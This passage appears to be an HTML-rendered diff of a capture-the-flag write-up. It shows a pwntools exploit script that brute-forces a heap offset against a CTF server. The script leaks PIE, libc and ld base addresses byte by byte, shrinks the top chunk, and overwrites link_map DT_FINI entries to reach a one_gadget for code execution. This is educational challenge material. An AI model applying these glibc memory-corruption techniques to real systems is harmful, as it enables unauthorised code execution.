+</span></span></span><span class="line"><span class="cl"><span class="s1">0x7ff7628f0030 &lt;_dl_catch_error@got.plt&gt;:	0x00007ff7627fdb30	0x0000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s1">0x7ff7628f0040 &lt;_rtld_global&gt;:	0x00007ff7628f12e0	0x0000000000000004
+</span></span></span><span class="line"><span class="cl"><span class="s1">0x7ff7628f0050 &lt;_rtld_global+16&gt;:	0x00007ff7628f15a0	0x0000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s1">...
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;out&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ld_rw_base</span> <span class="o">=</span> <span class="mh">0x00007ff7628f0000</span>
+</span></span><span class="line"><span class="cl"><span class="n">map_offset</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">rev_map</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&lt;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;:</span><span class="se">\t</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">offset</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">ld_rw_base</span>
+</span></span><span class="line"><span class="cl">    <span class="n">val_1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">val_1</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">val</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rev_map</span><span class="p">[</span><span class="n">val</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="n">map_offset</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
+</span></span><span class="line"><span class="cl">    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">    <span class="n">val_2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">val_2</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">val</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rev_map</span><span class="p">[</span><span class="n">val</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">            <span class="n">map_offset</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">local_url</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">local_port</span> <span class="o">=</span> <span class="mi">5000</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;mc.ax&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">31040</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">local_url</span><span class="p">,</span> <span class="n">local_port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Brute-force heap offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">num_try</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">num_try</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">num_try</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># POW solver</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;work:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">out</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">proof</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;solution: &#39;</span><span class="p">,</span> <span class="n">proof</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">clap</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span><span class="n">v2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;on:&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">v2</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">clap_str</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span><span class="n">v2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;on:&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">v1</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="n">v2</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">clap_bytes</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span><span class="n">v2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;on:&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">v1</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="n">v2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># BRUTEFORCE HEAP OFFSET</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        0x075aa98
+</span></span></span><span class="line"><span class="cl"><span class="s1">        0x0da8a98
+</span></span></span><span class="line"><span class="cl"><span class="s1">        0x1613a98
+</span></span></span><span class="line"><span class="cl"><span class="s1">        0x1eeca98
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">curr_heap_offset</span> <span class="o">=</span> <span class="mh">0x827a98</span>
+</span></span><span class="line"><span class="cl">        <span class="n">leak</span> <span class="o">=</span> <span class="mh">0x1b</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ctr</span> <span class="o">=</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Backtrack to find top_chunk, identified by the leak value is 0x51</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># (because top chunk size value is 0x20551)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">leak</span> <span class="o">==</span> <span class="mh">0x1b</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">curr_heap_offset</span> <span class="o">-=</span> <span class="mh">0x1000</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;offset = &#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">curr_heap_offset</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clap</span><span class="p">(</span><span class="n">curr_heap_offset</span><span class="p">,</span><span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;soul!&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">leak</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;top_chunk found: &#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;at offset = &#39;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">curr_heap_offset</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">found</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">==</span> <span class="mh">0x51</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Failed...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># Restore swapped value so that top chunk size isn&#39;t corrupted yet.</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clap</span><span class="p">(</span><span class="n">curr_heap_offset</span><span class="p">,</span><span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># PIE Leak</span>
+</span></span><span class="line"><span class="cl"><span class="n">pie_leak</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mh">0x18</span><span class="o">-</span><span class="n">i</span><span class="p">),</span><span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;soul!&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pie_leak</span> <span class="o">=</span> <span class="n">pie_leak</span> <span class="o">|</span> <span class="p">(</span> <span class="n">u8</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mh">0x18</span><span class="o">-</span><span class="n">i</span><span class="p">),</span><span class="o">-</span><span class="p">(</span><span class="mh">0x18</span><span class="o">-</span><span class="n">i</span><span class="p">))</span> <span class="c1"># restore original value</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pie_leak</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite top chunk third bytes to 0,</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># resulting in top chunk size become 0x551</span>
+</span></span><span class="line"><span class="cl"><span class="n">curr_heap_offset</span> <span class="o">+=</span> <span class="mh">0x2</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">curr_heap_offset</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">clap</span><span class="p">(</span><span class="n">curr_heap_offset</span><span class="p">,</span> <span class="n">curr_heap_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Top chunk overwritten to 0x551...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Trigger malloc in scanf, so that we will have unsorted bin</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># in the heap, and leak the libc address.</span>
+</span></span><span class="line"><span class="cl"><span class="n">clap_str</span><span class="p">(</span><span class="s1">&#39;500&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="o">*</span><span class="mh">0x500</span><span class="o">+</span><span class="s1">&#39;500&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Get unsorted bin to heap...&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">curr_heap_offset</span> <span class="o">+=</span> <span class="mh">0x6</span> <span class="o">+</span> <span class="mh">0x8</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span><span class="o">=</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">clap</span><span class="p">(</span><span class="n">curr_heap_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;soul!&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">|</span> <span class="p">(</span> <span class="n">u8</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">clap</span><span class="p">(</span><span class="n">curr_heap_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mh">0x96</span><span class="p">)</span> <span class="c1"># restore original value</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x21ac80</span><span class="o">+</span><span class="mi">96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">pie_leak</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0xebc85</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Leak dl_resolve to calculate ld_base and link_map address</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_offset</span> <span class="o">=</span> <span class="n">pie_leak</span><span class="o">+</span><span class="mh">0x18</span>
+</span></span><span class="line"><span class="cl"><span class="n">dl_resolve_got</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a010</span>
+</span></span><span class="line"><span class="cl"><span class="n">dl_offset</span> <span class="o">=</span> <span class="n">dl_resolve_got</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_ld</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">clap</span><span class="p">(</span><span class="n">dl_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;soul!&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">leaked_ld</span> <span class="o">=</span> <span class="n">leaked_ld</span> <span class="o">|</span> <span class="p">(</span> <span class="n">u8</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">clap</span><span class="p">(</span><span class="n">dl_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_ld</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ld_base</span> <span class="o">=</span> <span class="n">leaked_ld</span> <span class="o">-</span> <span class="mh">0x15d30</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">ld_base</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">link_map</span> <span class="o">=</span> <span class="n">ld_base</span> <span class="o">+</span> <span class="mh">0x3b2e0</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">link_map</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Nullify link_map-&gt;l_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">l_addr_offset</span> <span class="o">=</span> <span class="n">link_map</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">l_addr_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">l_addr_offset</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;nullify l_addr&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Nullify link_map-&gt;l_info[DT_FINI_ARRAY]</span>
+</span></span><span class="line"><span class="cl"><span class="n">dt_fini_array_offset</span> <span class="o">=</span> <span class="n">link_map</span><span class="o">+</span><span class="mh">0x0110</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">dt_fini_array_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dt_fini_array_offset</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;nullify dt_fini&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite link_map-&gt;l_info[DT_FINI] with l_name</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># We will use the `l_name` stored address as our link_map-&gt;l_info[DT_FINI] value</span>
+</span></span><span class="line"><span class="cl"><span class="n">l_name_offset</span> <span class="o">=</span> <span class="n">link_map</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">dt_fini_offset</span> <span class="o">=</span> <span class="n">link_map</span><span class="o">+</span><span class="mh">0xa8</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clap</span><span class="p">(</span><span class="n">dt_fini_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">dt_fini_offset</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">clap</span><span class="p">(</span><span class="n">l_name_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">dt_fini_offset</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;finish overwrite&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Leak link_map-&gt;l_info[DT_FINI] value that just got overwritten</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_dt_fini</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">dt_fini_offset</span> <span class="o">=</span> <span class="n">link_map</span><span class="o">+</span><span class="mh">0xa8</span> <span class="o">-</span> <span class="n">base_offset</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">clap</span><span class="p">(</span><span class="n">dt_fini_offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mh">0x96</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;soul!&#39;</span><span class="p">,</span><span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
